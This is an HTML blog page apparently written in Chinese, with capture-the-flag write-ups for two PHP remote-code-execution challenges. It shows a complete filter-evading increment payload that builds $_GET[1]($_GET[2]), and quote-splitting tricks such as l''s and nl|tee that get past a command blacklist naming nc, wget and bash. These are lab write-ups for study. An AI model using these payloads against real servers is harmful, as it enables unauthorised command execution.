@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="RCE专栏[HNCTF 2022 Week1]Challenge__rce题目链接[HNCTF 2022 Week1]Challenge__rce | NSSCTF 题目考点无参RCE，主要通过自增来实现构造pyload，最终来实现执行危险函数，（自增是单字符型变量自增能得到下一个字符，如 a&#x3D; &#39;A&#39;; a++; &#x2F;&#x2F; 此时$a为B 而数组转字符串后是天然的字符串 Array">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCE">
+<meta property="og:url" content="https://dgxddd.github.io/2022/12/25/RCE/">
+<meta property="og:site_name" content="jxdgx">
+<meta property="og:description" content="RCE专栏[HNCTF 2022 Week1]Challenge__rce题目链接[HNCTF 2022 Week1]Challenge__rce | NSSCTF 题目考点无参RCE，主要通过自增来实现构造pyload，最终来实现执行危险函数，（自增是单字符型变量自增能得到下一个字符，如 a&#x3D; &#39;A&#39;; a++; &#x2F;&#x2F; 此时$a为B 而数组转字符串后是天然的字符串 Array">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230924194912694.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230924195229395.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230924210804905.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230924215519120.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230924224307133.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230924224556356.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230924224713041.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230924230254116.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230925154125365.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230925154232793.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230925160504216.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230925160609994.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230925160951514.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230925161154018.png">
+<meta property="article:published_time" content="2022-12-25T12:43:35.000Z">
+<meta property="article:modified_time" content="2026-05-25T12:44:09.386Z">
+<meta property="article:author" content="jxdgx">
+<meta property="article:tag" content="RCE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230924194912694.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/logo.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+        
+      
+    
+    <!-- title -->
+    <title>RCE | jxdgx</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+<!-- mathjax -->
+
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+        inlineMath: [['$','$']],
+        displayMath: [['$$','$$'], ['\[','\]']]
+      }
+    });
+  </script>
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+
+<meta name="generator" content="Hexo 8.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr is-post-page">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2023/03/21/stardust/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://dgxddd.github.io/2022/12/25/RCE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://dgxddd.github.io/2022/12/25/RCE/&text=RCE"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://dgxddd.github.io/2022/12/25/RCE/&title=RCE"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://dgxddd.github.io/2022/12/25/RCE/&is_video=false&description=RCE"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RCE&body=Check out this article: https://dgxddd.github.io/2022/12/25/RCE/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://dgxddd.github.io/2022/12/25/RCE/&title=RCE"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://dgxddd.github.io/2022/12/25/RCE/&title=RCE"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://dgxddd.github.io/2022/12/25/RCE/&title=RCE"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://dgxddd.github.io/2022/12/25/RCE/&title=RCE"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://dgxddd.github.io/2022/12/25/RCE/&name=RCE&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://dgxddd.github.io/2022/12/25/RCE/&t=RCE"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE%E4%B8%93%E6%A0%8F"><span class="toc-number">1.</span> <span class="toc-text">RCE专栏</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-Week1-Challenge-rce"><span class="toc-number">1.1.</span> <span class="toc-text">[HNCTF 2022 Week1]Challenge__rce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5"><span class="toc-number">1.1.1.</span> <span class="toc-text">题目链接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%80%83%E7%82%B9"><span class="toc-number">1.1.2.</span> <span class="toc-text">题目考点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.3.</span> <span class="toc-text">做题过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.4.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-finalrce"><span class="toc-number">1.2.</span> <span class="toc-text">[SWPUCTF 2021 新生赛]finalrce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">题目链接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%80%83%E7%82%B9-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">题目考点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">做题过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">1.2.4.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        
+<div class="post-layout">
+  <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      
+    <h1 class="posttitle p-name" itemprop="name headline">
+        RCE
+    </h1>
+
+
+
+      <div class="meta meta-post">
+        
+    <div class="postdate">
+      
+        <time datetime="2022-12-25T12:43:35.000Z" class="dt-published" itemprop="datePublished">2022-12-25</time>
+        
+      
+    </div>
+
+
+        
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+    </div>
+
+
+        
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/RCE/" rel="tag">RCE</a>
+    </div>
+
+
+      </div>
+    </header>
+    
+
+    <div class="content e-content" itemprop="articleBody">
+      <h1 id="RCE专栏"><a href="#RCE专栏" class="headerlink" title="RCE专栏"></a>RCE专栏</h1><h2 id="HNCTF-2022-Week1-Challenge-rce"><a href="#HNCTF-2022-Week1-Challenge-rce" class="headerlink" title="[HNCTF 2022 Week1]Challenge__rce"></a>[HNCTF 2022 Week1]Challenge__rce</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2943">HNCTF 2022 Week1]Challenge__rce | NSSCTF</a></p>
+<h3 id="题目考点"><a href="#题目考点" class="headerlink" title="题目考点"></a>题目考点</h3><p>无参RCE，主要通过自增来实现构造pyload，最终来实现执行危险函数，（自增是单字符型变量自增能得到下一个字符，如 <script type="math/tex">a= 'A'; </script>a++; &#x2F;&#x2F; 此时$a为B 而数组转字符串后是天然的字符串 Array ，我们切片取A，通过自增便可得到任意一个大写字母）</p>
+<h3 id="做题过程"><a href="#做题过程" class="headerlink" title="做题过程"></a>做题过程</h3><p>我们点击进去后啥都没有发现，这个时候我们一般都是点击F12查看一下有啥提示</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230924194912694.png" alt="image-20230924194912694"></p>
+<p>我们访问一下&#x2F;?hint后发现了源码，这个时候我们去分析源码</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230924195229395.png" alt="image-20230924195229395"></p>
+<p>在这里我们要过4个if判断才可以执行危险函数eval，首先第一个判断是我们传入的数据不可以为空，第二个判断是我们传参的长度不可以大于120，第三个判断是我们的传参一定要是字符串，最后一个是传参的字符中不可以包含[!@#%^&amp;*:’-&lt;?&gt;&quot;/|&#96;a-zA-Z~\\]，首先我们可以看出我们最不好过的是第1个判断和最后一个判断，首先我们的字符串不可以大于120我们传参还不可以有上面显示的字符，我们先用一个脚本来看一下都是由哪些字符没有被过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for($a = 36; $a &lt; 127; $a++)&#123;</span><br><span class="line">    if (!preg_match(&quot;/[!@#%^&amp;*:&#x27;\-&lt;?&gt;\&quot;\/|`a-zA-Z~\\\\]/i&quot;, chr($a)))&#123;</span><br><span class="line">        echo chr($a).&quot; &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们这个脚本是用来测试我们剩余的没有过滤的字符串$ ( ) + , . 0 1 2 3 4 5 6 7 8 9 ; &#x3D; [ ] _ { }这基本都过滤了我们可以用自增来完成</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230924210804905.png" alt="image-20230924210804905"></p>
+<p>[]在php中字母为Array我们可以获取第一个字母的时候为A，然后我们对其自增可以得到B这个时候我们可以做到chr()这个函数然后我们在通过数字来实现将其转化为字母。构造出如 <script type="math/tex">_GET[1](</script>_GET[2])样式的我们进行传参，下面我们给出代码方便于大家来进行调试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[]._;</span><br><span class="line">//echo $_;Array_</span><br><span class="line">$__=$_[1];</span><br><span class="line">//echo $__;//r</span><br><span class="line">$_=$_[0];</span><br><span class="line">//echo $_; //A</span><br><span class="line">$_++;</span><br><span class="line">//echo $_; //B</span><br><span class="line">$_1=++$_;</span><br><span class="line">//echo $_1;//C</span><br><span class="line">$_++;</span><br><span class="line">//echo $_; //D</span><br><span class="line">$_++;$_++;$_++;</span><br><span class="line">//echo $_; //G</span><br><span class="line">$_=$_1.++$_.$__;</span><br><span class="line">//echo $_;//CHr</span><br><span class="line">$_=_.$_(71).$_(69).$_(84);</span><br><span class="line">//echo   $_;//_GET</span><br><span class="line">//$$_[1]($$_[2]);//这个时候因为$_为_GET,则$$_[1]($$_[2]);可以看为$_GET[1]($_GET[2])</span><br></pre></td></tr></table></figure>
+
+<p>这个时候我们构造出来了我们来测试一下长度看是否是小于120的，最后我们测试是118正好满足规则</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 输入字符串</span><br><span class="line">$input_string = &#x27;$_=[]._;$__=$_[1];$_=$_[0];$_++;$_1=++$_;$_++;$_++;$_++;$_++;$_=$_1.++$_.$__;$_=_.$_(71).$_(69).$_(84);$$_[1]($$_[2]);&#x27;;</span><br><span class="line">// 获取字符串的长度</span><br><span class="line">$length = strlen($input_string);</span><br><span class="line">// 输出字符串和它的长度</span><br><span class="line">echo &quot;输入字符串: $input_string\n&quot;;</span><br><span class="line">echo &quot;字符串长度: $length\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230924215519120.png" alt="image-20230924215519120"></p>
+<p>pyload为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rce=$_=[]._;$__=$_[1];$_=$_[0];$_++;$_1=++$_;$_++;$_++;$_++;$_++;$_=$_1.++$_.$__;$_=_.$_(71).$_(69).$_(84);$$_[1]($$_[2]);</span><br></pre></td></tr></table></figure>
+
+<p>我们这个时候我们用post传输pyload，然后在GET方式进行命令执行，具体如下</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230924224307133.png" alt="image-20230924224307133"></p>
+<p>因为在我们进行post传参的时候，会输出<script type="math/tex">_GET[1](</script>_GET[2])的形式这个时候我们使用GET进行传参，来执行命令</p>
+<p>我们查看根目录的时候发现ffflllaaaggg文件</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230924224556356.png" alt="image-20230924224556356"></p>
+<p>我们使用tac来查看这个文件得到flag</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230924224713041.png" alt="image-20230924224713041"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个题主要就是通过构造出来<script type="math/tex">_GET[1](</script>_GET[2])来实现命令执行，这个就是一个典型的无参RCE除了这个还可以就是通过取反和异或来做这中无参RCE的题</p>
+<p>无参数RCE，其实就是通过没有参数的函数达到命令执行的目的</p>
+<h2 id="SWPUCTF-2021-新生赛-finalrce"><a href="#SWPUCTF-2021-新生赛-finalrce" class="headerlink" title="[SWPUCTF 2021 新生赛]finalrce"></a>[SWPUCTF 2021 新生赛]finalrce</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/438">https://www.nssctf.cn/problem/438</a></p>
+<h3 id="题目考点-1"><a href="#题目考点-1" class="headerlink" title="题目考点"></a>题目考点</h3><p>无回显rce和一些linux命令的函数的使用，</p>
+<p>原理：成功地注入了恶意代码或命令，目标系统将执行这些命令，但不会将执行结果回显到终端</p>
+<h3 id="做题过程-1"><a href="#做题过程-1" class="headerlink" title="做题过程"></a>做题过程</h3><p>这个题我们点击进行后就给出了源码</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230924230254116.png" alt="image-20230924230254116"></p>
+<p>我们分析源码可以知道，我们传参不可以为空且没有&#x2F;bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|-|*|&quot;|&gt;|&lt;|%|$&#x2F;i这些就可以命令执行</p>
+<p>这个时候ls过滤了但是我们发现单引号没有过滤我们可以使用但引号将这个拼接起来，我们在kali中试一下效果</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230925154125365.png" alt="image-20230925154125365"></p>
+<p>这个时候我们是可以执行l’’s的，这个时候我们发现是执行成功的，但因为exec()执行后没有回显所以就没有，显示出来</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230925154232793.png" alt="image-20230925154232793"></p>
+<p>我们可以想办法将我们l’’s的看到的写到一个文件中，这个时候我们想到了一个命令tee，这个也正好没有被过滤</p>
+<p>（tee这个命令是将l’’s执行的命令执行到一个文件中一般如 l’’s &#x2F;| tee 1.txt,就是将l’’s看到的执行写入1.txt中，这个时候我们访问1.txt就可以看到执行的命令了）</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230925160504216.png" alt="image-20230925160504216"></p>
+<p>我们这个时候在去访问1.txt文件</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230925160609994.png" alt="image-20230925160609994"></p>
+<p>我们这个时候还可以用上面那一种方法来查看flllllaaaaaaggggggg这个文件，禁用了cat，我们还可以使用nl和tac来查看，因为禁用了la我们这个地方还是可以用单引号进行一下拼接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl /flllll&#x27;&#x27;aaaaaaggggggg|tee 1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230925160951514.png" alt="image-20230925160951514"></p>
+<p>这个时候我们再去访问1.txt得到flag</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20230925161154018.png" alt="image-20230925161154018"></p>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>这主要是为了帮助大家学习在遇到这种不回显的RCE的时候应该如何去做，还有一些危险命令被禁用的时候我们可以使用一些技巧来进行过滤掉，如同上一题的自增，和这题的单引号，还是要大家多去做。</p>
+
+    </div>
+  </article>
+  
+    <aside class="post-sidebar-toc">
+      <div class="post-sidebar-toc-inner">
+        <div class="post-sidebar-toc-title">Contents</div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE%E4%B8%93%E6%A0%8F"><span class="toc-number">1.</span> <span class="toc-text">RCE专栏</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-Week1-Challenge-rce"><span class="toc-number">1.1.</span> <span class="toc-text">[HNCTF 2022 Week1]Challenge__rce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5"><span class="toc-number">1.1.1.</span> <span class="toc-text">题目链接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%80%83%E7%82%B9"><span class="toc-number">1.1.2.</span> <span class="toc-text">题目考点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.3.</span> <span class="toc-text">做题过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.4.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-finalrce"><span class="toc-number">1.2.</span> <span class="toc-text">[SWPUCTF 2021 新生赛]finalrce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">题目链接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%80%83%E7%82%B9-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">题目考点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">做题过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">1.2.4.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li></ol>
+      </div>
+    </aside>
+  
+</div>
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE%E4%B8%93%E6%A0%8F"><span class="toc-number">1.</span> <span class="toc-text">RCE专栏</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-Week1-Challenge-rce"><span class="toc-number">1.1.</span> <span class="toc-text">[HNCTF 2022 Week1]Challenge__rce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5"><span class="toc-number">1.1.1.</span> <span class="toc-text">题目链接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%80%83%E7%82%B9"><span class="toc-number">1.1.2.</span> <span class="toc-text">题目考点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.3.</span> <span class="toc-text">做题过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.4.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-finalrce"><span class="toc-number">1.2.</span> <span class="toc-text">[SWPUCTF 2021 新生赛]finalrce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">题目链接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%80%83%E7%82%B9-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">题目考点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E8%BF%87%E7%A8%8B-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">做题过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">1.2.4.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://dgxddd.github.io/2022/12/25/RCE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://dgxddd.github.io/2022/12/25/RCE/&text=RCE"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://dgxddd.github.io/2022/12/25/RCE/&title=RCE"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://dgxddd.github.io/2022/12/25/RCE/&is_video=false&description=RCE"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RCE&body=Check out this article: https://dgxddd.github.io/2022/12/25/RCE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://dgxddd.github.io/2022/12/25/RCE/&title=RCE"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://dgxddd.github.io/2022/12/25/RCE/&title=RCE"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://dgxddd.github.io/2022/12/25/RCE/&title=RCE"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://dgxddd.github.io/2022/12/25/RCE/&title=RCE"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://dgxddd.github.io/2022/12/25/RCE/&name=RCE&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://dgxddd.github.io/2022/12/25/RCE/&t=RCE"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
